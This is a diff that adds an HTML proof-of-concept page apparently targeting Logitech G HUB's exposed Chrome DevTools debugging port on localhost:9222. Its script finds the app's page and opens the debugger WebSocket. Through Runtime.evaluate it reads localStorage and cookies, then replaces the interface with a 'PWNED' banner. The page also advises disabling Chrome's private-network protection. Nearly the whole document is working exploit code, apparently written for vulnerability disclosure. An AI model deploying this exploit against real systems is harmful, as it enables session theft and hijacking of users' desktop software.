@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>//</title>
+    <style>
+    </style>
+</head>
+
+<body>
+    <h1>PoC</h1>
+    <button onclick="connectAndPwn()">1. Connect & Exfiltrate Data</button>
+
+    <h3>Logs</h3>
+    <div id="log" class="log"></div>
+
+    <script>
+        const logDiv = document.getElementById('log');
+        function log(msg, type = '') {
+            const entry = document.createElement('div');
+            entry.className = type;
+            entry.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            logDiv.appendChild(entry);
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+        async function connectAndPwn() {
+            log("Attempting to connect to localhost:9222...", "cmd");
+            try {
+                const response = await fetch("http://127.0.0.1:9222/json", { mode: 'no-cors' });
+                const targets = await response.json();
+                const mainPage = targets.find(p => p.type === "page");
+
+                if (!mainPage) {
+                    log("Target page not found. Is LGHUB open?", "error");
+                    return;
+                }
+
+                log(`Target found: ${mainPage.title}`, "success");
+                const ws = new WebSocket(mainPage.webSocketDebuggerUrl);
+
+                ws.onopen = () => {
+                    log("WebSocket Connected! Sending payloads...", "success");
+                    const exfiltrateScript = `
+                        JSON.stringify({
+                            localStorage: localStorage,
+                            cookies: document.cookie,
+                            url: document.location.href
+                        });
+                    `;
+                    const uiScript = `
+                        document.body.innerHTML = "<div style='background:red;color:white;font-size:50px;text-align:center;padding:100px;'><h1>PWNED</h1><p>This UI is now under attacker control.</p></div>";
+                        console.log('UI Overwritten');
+                    `;
+                    ws.send(JSON.stringify({
+                        id: 1,
+                        method: "Runtime.evaluate",
+                        params: { expression: exfiltrateScript }
+                    }));
+                    ws.send(JSON.stringify({
+                        id: 2,
+                        method: "Runtime.evaluate",
+                        params: { expression: uiScript }
+                    }));
+                };
+
+                ws.onmessage = (e) => {
+                    const data = JSON.parse(e.data);
+                    if (data.id === 1 && data.result.result.value) {
+                        log("DATA EXFILTRATED:", "success");
+                        log(data.result.result.value);
+                    }
+                };
+
+            } catch (e) {
+                log("Connection failed. Make sure to disable 'Block insecure private network requests' in chrome://flags for this PoC demo.", "error");
+            }
+        }
+    </script>
+</body>
+
+</html>
